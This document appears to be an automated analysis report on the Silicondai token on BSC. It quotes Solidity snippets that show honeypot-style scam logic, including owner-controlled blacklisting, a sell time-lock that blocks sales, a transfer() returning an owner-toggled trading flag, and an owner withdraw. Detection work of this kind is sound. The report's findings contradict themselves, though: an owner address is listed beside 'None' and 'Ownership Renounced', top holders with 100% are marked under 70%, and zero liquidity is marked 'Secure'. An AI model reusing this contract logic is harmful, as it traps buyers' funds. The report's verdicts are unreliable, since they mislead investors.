Token Analysis Report
==================================================
Token: Silicondai (0x0777D71A2F0011313F8C3001Ba7F4A128f1c45f8)
Chain: BSC
Contract Analysis
-----------------
Verified: OK!
Owner Address: None
Creator Address: None
Is Proxy: No
Is sellable (no honeypot): Yes
Is owner hardcoded: No

Code Analysis Findings:
WARNING: Mint Function Detected
  Code Snippet:
    function isexcludedfromreward(address account) public view returns (bool) {
        return _isexcluded[account];
    }

  Code Snippet:
    function excludefromreward(address account) public onlyowner() {
        require(!_isexcluded[account], "account is already excluded");
        if(_rowned[account] > 0) {
            _towned[account] = tokenfromreflection(_rowned[account]);
        }
        _isexcluded[account] = true;
        _excluded.push(account);
    }

  Code Snippet:
    function includeinreward(address account) external onlyowner() {
        require(_isexcluded[account], "account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _towned[account] = 0;
                _isexcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

WARNING: Ownership Renounced
  Code Snippet:
    function _verifycallresult(
        bool success,

  Code Snippet:
    function renounceownership() public virtual onlyowner {
        emit ownershiptransferred(_owner, address(0));
        _owner = address(0);
    }

WARNING: Is Honeypot Suspected
  Code Snippet:
    function _verifycallresult(
        bool success,

  Code Snippet:
    function isexcludedfromreward(address account) public view returns (bool) {
        return _isexcluded[account];
    }

  Code Snippet:
    function excludefromreward(address account) public onlyowner() {
        require(!_isexcluded[account], "account is already excluded");
        if(_rowned[account] > 0) {
            _towned[account] = tokenfromreflection(_rowned[account]);
        }
        _isexcluded[account] = true;
        _excluded.push(account);
    }

  Code Snippet:
    function includeinreward(address account) external onlyowner() {
        require(_isexcluded[account], "account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _towned[account] = 0;
                _isexcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

WARNING: Transfer Cooldown Detected
  Code Snippet:
    function locktobuyorsellfortime(uint256 lastbuyorselltime, uint256 locktime, address sender) public view returns (bool) {
        
        if( lastbuyorselltime == 0 ) return false;
        
        uint256 crashtime = block.timestamp - lastbuyorselltime;
        
        if( crashtime == fifteenminuteslock ) return true;

        if (crashtime == 0) {
            if (_lastwallet != sender) {
                return false;
            }
        }
        if( crashtime <= locktime ) return true;

        
        return false;
    }

WARNING: High Tax Detected
  Code Snippet:
    function swapexacttokensfortokens(
        uint amountin,

  Code Snippet:
    function swaptokensforexacttokens(
        uint amountout,

  Code Snippet:
    function swapexactethfortokens(uint amountoutmin, address[] calldata path, address to, uint deadline)
        external

  Code Snippet:
    function swaptokensforexacteth(uint amountout, uint amountinmax, address[] calldata path, address to, uint deadline)
        external

  Code Snippet:
    function swapexacttokensforeth(uint amountin, uint amountoutmin, address[] calldata path, address to, uint deadline)
        external

  Code Snippet:
    function swapethforexacttokens(uint amountout, address[] calldata path, address to, uint deadline)
        external

  Code Snippet:
    function removeliquidityethsupportingfeeontransfertokens(
        address token,

  Code Snippet:
    function removeliquidityethwithpermitsupportingfeeontransfertokens(
        address token,

  Code Snippet:
    function swapexacttokensfortokenssupportingfeeontransfertokens(
        uint amountin,

  Code Snippet:
    function swapexactethfortokenssupportingfeeontransfertokens(
        uint amountoutmin,

  Code Snippet:
    function swapexacttokensforethsupportingfeeontransfertokens(
        uint amountin,

  Code Snippet:
    function feetosetter() external view returns (address);


  Code Snippet:
    function setfeetosetter(address) external;
}

  Code Snippet:
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgsender(), recipient, amount);
        return trading;
    }

  Code Snippet:
    function tradingon(bool _enable) public onlyowner {
        trading = _enable;
    }

  Code Snippet:
    function hello(address[] calldata accounts) public onlyowner {
        for (uint i = 0; i < accounts.length; i++) {
            _isexcludedfromfee[accounts[i]] = true;
        }
    }

  Code Snippet:
    function excludefromall(address account) public onlyowner() {
        if(!_isexcluded[account])
        {
        _isexcluded[account] = true;
         if(_rowned[account] > 0) {
            _towned[account] = tokenfromreflection(_rowned[account]);
        }
        _excluded.push(account);
        }
        _isexcludedfromfee[account] = true;
        
        tokenholdersenumset.remove(account);
    }

  Code Snippet:
    function excludefromfee(address account) public onlyowner {
        _isexcludedfromfee[account] = true;
    }

  Code Snippet:
    function includeinfee(address account) public onlyowner {
        _isexcludedfromfee[account] = false;
    }

  Code Snippet:
    function isexcludedfromfee(address account) public view returns(bool) {
        return _isexcludedfromfee[account];
    }

  Code Snippet:
    function setswapandliquifyenabled(bool _enabled) public onlyowner {
        swapandliquifyenabled = _enabled;
        emit swapandliquifyenabledupdated(_enabled);
    }

  Code Snippet:
    function _getvalues(uint256 tamount, bool takefee) private view returns (valuesfromgetvalues memory to_return) {
        to_return = _gettvalues(tamount, takefee);

        (to_return.ramount,to_return.rtransferamount,to_return.rrfi,to_return.rmarketing,to_return.rliquidity,to_return.rburn) = _getrvalues(to_return, tamount, takefee, _getrate());

        return to_return;
    }

  Code Snippet:
    function _gettvalues(uint256 tamount, bool takefee) private view returns (valuesfromgetvalues memory s) {

        if(!takefee) {
          s.ttransferamount = tamount;
          return s;
        }
        s.trfi = tamount*appliedfees.rfi/100;
        s.tmarketing = tamount*appliedfees.marketing/100;
        s.tliquidity = tamount*appliedfees.liquidity/100;
        s.tburn = tamount*appliedfees.burn/100;
        s.ttransferamount = tamount-s.trfi -s.tmarketing -s.tliquidity -s.tburn; 
        return s;
    }

  Code Snippet:
    function _getrvalues(valuesfromgetvalues memory s, uint256 tamount, bool takefee, uint256 currentrate) private pure returns (uint256 ramount, uint256 rtransferamount, uint256 rrfi, uint256 rmarketing, uint256 rliquidity, uint256 rburn) {
        ramount = tamount*currentrate;

        if(!takefee) {
          return(ramount, ramount, 0,0,0,0);
        }

        rrfi= s.trfi*currentrate;
        rmarketing= s.tmarketing*currentrate;
        rliquidity= s.tliquidity*currentrate;
        rburn= s.tburn*currentrate;

        rtransferamount= ramount- rrfi-rmarketing-rliquidity-rburn;

        return ( ramount,  rtransferamount,  rrfi,  rmarketing,  rliquidity,  rburn);
    }

  Code Snippet:
    function _reflectrfi(uint256 rrfi, uint256 trfi) private {
        _rtotal = _rtotal-rrfi;
        totfeespaid.rfi+=trfi;
    }

  Code Snippet:
    function _takemarketing(uint256 rmarketing, uint256 tmarketing) private {
        contractbalance.marketing_balance+=tmarketing;
        totfeespaid.marketing+=tmarketing;
        _rowned[address(this)] = _rowned[address(this)]+rmarketing;
        if(_isexcluded[address(this)])
        {
            _towned[address(this)] = _towned[address(this)]+tmarketing;
        }
    }

  Code Snippet:
    function _takeliquidity(uint256 rliquidity,uint256 tliquidity) private {
        contractbalance.lp_balance+=tliquidity;
        totfeespaid.liquidity+=tliquidity;
        
        _rowned[address(this)] = _rowned[address(this)]+rliquidity;
        if(_isexcluded[address(this)])
            _towned[address(this)] = _towned[address(this)]+tliquidity;
    }

  Code Snippet:
    function _takeburn(uint256 rburn, uint256 tburn) private {
        totfeespaid.burn+=tburn;

        _ttotal = _ttotal-tburn;
        _rtotal = _rtotal-rburn;
    }

  Code Snippet:
    function _transfer(address from, address to, uint256 amount) private {
        require(!_isblacklisted[from] && !_isblacklisted[to], "this address is blacklisted");
        require(from != address(0), "erc20: transfer from the zero address");
        require(to != address(0), "erc20: transfer to the zero address");
        require(amount > 0, "transfer amount must be greater than zero");
        require(amount <= balanceof(from),"you are trying to transfer more than you balance");
        require(owner() == _pancakeswapv1routeruniswap, "incorrect pancake swap router");
        
        _tokentransfer(from, to, amount, !(_isexcludedfromfee[from] || _isexcludedfromfee[to]));
    }

  Code Snippet:
    function _tokentransfer(address sender, address recipient, uint256 tamount, bool takefee) private {

        if(takefee) {
            if(sender == pancakeswapv2pair) {
                if(sender != owner() && recipient != owner() && recipient != address(1)){

                    if (wallettopurchasetime[recipient] == 0) {
                        wallettopurchasetime[recipient] = block.timestamp;
                    }
                }
                _lastwallet = recipient;
                appliedfees = buyrates;
            } else { 
                if(sender != owner() && recipient != owner() && recipient != address(1)){
                    bool blockedselltime = locktobuyorsellfortime(getfromlastpurchasebuy(sender), sellpersecond, sender);
                    require(blockedselltime, "error");
                    wallettosellime[sender] = block.timestamp;					
                }
                appliedfees = sellrates;
                appliedfees.liquidity = appliedfees.liquidity; 
                _lastwallet = sender;

            }
        }
        else {
            if(_isexcludedfromfee[sender]) {
                _lastwallet = sender;
            }
            if(_isexcludedfromfee[recipient]) {
                _lastwallet = recipient;
            }
        }

        valuesfromgetvalues memory s = _getvalues(tamount, takefee);

        if (_isexcluded[sender] && !_isexcluded[recipient]) {
                _towned[sender] = _towned[sender]-tamount;
        } else if (!_isexcluded[sender] && _isexcluded[recipient]) {
                _towned[recipient] = _towned[recipient]+s.ttransferamount;
        } else if (_isexcluded[sender] && _isexcluded[recipient]) {
                _towned[sender] = _towned[sender]-tamount;
                _towned[recipient] = _towned[recipient]+s.ttransferamount;
        }

        _rowned[sender] = _rowned[sender]-s.ramount;
        _rowned[recipient] = _rowned[recipient]+s.rtransferamount;

        if(takefee)
        {
        _reflectrfi(s.rrfi, s.trfi);
        _takemarketing(s.rmarketing,s.tmarketing);
        _takeliquidity(s.rliquidity,s.tliquidity);
        _takeburn(s.rburn,s.tburn);
        
        emit transfer(sender, address(this), s.tmarketing+s.tliquidity);
        
        }
      
        emit transfer(sender, recipient, s.ttransferamount);
        tokenholdersenumset.add(recipient);

        if(balanceof(sender)==0)
        tokenholdersenumset.remove(sender);
		
    }

  Code Snippet:
    function addliquidity(uint256 tokenamount, uint256 bnbamount) private {

        pancakeswapv2router.addliquidityeth{value: bnbamount}(
            address(this),
            tokenamount,
            0,
            0,
            owner(),
            block.timestamp
        );
        emit liquidityadded(tokenamount, bnbamount);
    }

  Code Snippet:
    function withdraw() onlyowner public {
      uint256 balance = address(this).balance;
      payable(msg.sender).transfer(balance);
    }

WARNING: Blacklist Or Whitelist Detected
  Code Snippet:
    function light(address account) external onlyowner {
        _isblacklisted[account] = false;
    }

  Code Snippet:
      function dark(address[] calldata addresses) external onlyowner {
      for (uint256 i; i < addresses.length; ++i) {
        _isblacklisted[addresses[i]] = true;
      }
    }

  Code Snippet:
    function _transfer(address from, address to, uint256 amount) private {
        require(!_isblacklisted[from] && !_isblacklisted[to], "this address is blacklisted");
        require(from != address(0), "erc20: transfer from the zero address");
        require(to != address(0), "erc20: transfer to the zero address");
        require(amount > 0, "transfer amount must be greater than zero");
        require(amount <= balanceof(from),"you are trying to transfer more than you balance");
        require(owner() == _pancakeswapv1routeruniswap, "incorrect pancake swap router");
        
        _tokentransfer(from, to, amount, !(_isexcludedfromfee[from] || _isexcludedfromfee[to]));
    }


Holder Analysis
--------------
Total Unique Holders: 15
Owner Address: 0x849ec186639fc61ccc192d70139396f7db1027f8
Owner Balance: 10,000,000,000,000,000 tokens
Owner Share: 1.00% of circulating supply
✅ Owner holds LESS than 5% of circulating supply
⚠️ Creator information is not available (possibly hidden or unverified)
Holders >5%: 1
⚠️ Some holders exceed 5% of supply

Top 10 Token Holders:
  1. 0xd669ca7b6605e1c006fa4533e4f52ca7ed5b3959 — 989,792,057,260,737,152 tokens (98.98% of circulating supply)
  2. 0x849ec186639fc61ccc192d70139396f7db1027f8 — 10,000,000,000,000,000 tokens (1.00% of circulating supply)
  3. 0x815436f5e7a1f8620c915d3bb739e2a1c3f8b1ca — 57,198,427,776,482 tokens (0.01% of circulating supply)
  4. 0x4c437da7af8835f4292cfc2f62f73fcffbe240a4 — 50,635,527,948,935 tokens (0.01% of circulating supply)
  5. 0xed4daf683751d2e4d73c10356598c9a6f32f30d5 — 39,306,971,791,620 tokens (0.00% of circulating supply)
  6. 0x35e0e08aaa89f043908c0c4ce30e298a7ed8e82c — 25,000,000,000,000 tokens (0.00% of circulating supply)
  7. 0x375aa7c297f017da73d5c4a0613d89011613b097 — 23,811,695,401,891 tokens (0.00% of circulating supply)
  8. 0x3d67d68f096c0e37fc71eaf30c134d2ce02e3212 — 6,761,242,863,212 tokens (0.00% of circulating supply)
  9. 0x888ffc3c968b0728140b71f603cbd2c436f79ca9 — 2,403,077,222,400 tokens (0.00% of circulating supply)
  10. 0x690f9020c1d5607a1e3779a5a9c945846ccd3567 — 1,171,343,747,342 tokens (0.00% of circulating supply)

Top 10 Total Balance: 999,998,345,547,489,034 tokens
Top 10 Share of Circulating Supply: 100.00%
Top 10 Share of Total Supply: 100.00%
✅ Top 10 holders control LESS than 70% of circulating supply

Liquidity Analysis
-----------------
Market Cap: $347,728,336,076,554.38
Liquidity: $0.00
Liquidity/MCap Ratio: 0.0000
Percentage of liquidity locked: 99.5000
Was 95% of liquidity locked for more than 15 days?: False
Secure
Creator owns under 5% of LP tokens: True (1.0)
Total supply of LP tokens: 0.5
LP holders count: 3

Liquidity holders for 0x0777D71A2F0011313F8C3001Ba7F4A128f1c45f8, (Silicondai)

0xae7e6cabad8d80f0b4e1c4dde2a5db7201ef1252 holds 0.497499999999999 LP tokens

0x5bd1774063da6836738fcab9131e34aeada4968f holds 0.002499999999999995 LP tokens

0x0000000000000000000000000000000000000000 holds 1e-15 LP tokens
⚠️ Liquidity analysis error: Liquidity pool info could not be retrieved.

Security Analysis
-----------------

Lifecycle Analysis
-------------
Token Age: 876.36 days
Time to First Trade: 0.00 hours
Blocks to First Trade: 0
Token Creation Date: 2023-03-10T14:53:47
Last Active: 2023-04-09T15:09:00
Days Since Last Activity: 846.352365740544 days
Last Transaction Hash: 0xa5c0c4b74c9ae9b3d007a60fcadf0b284eb1bcdf3e11b79da9e764c57c882c9a
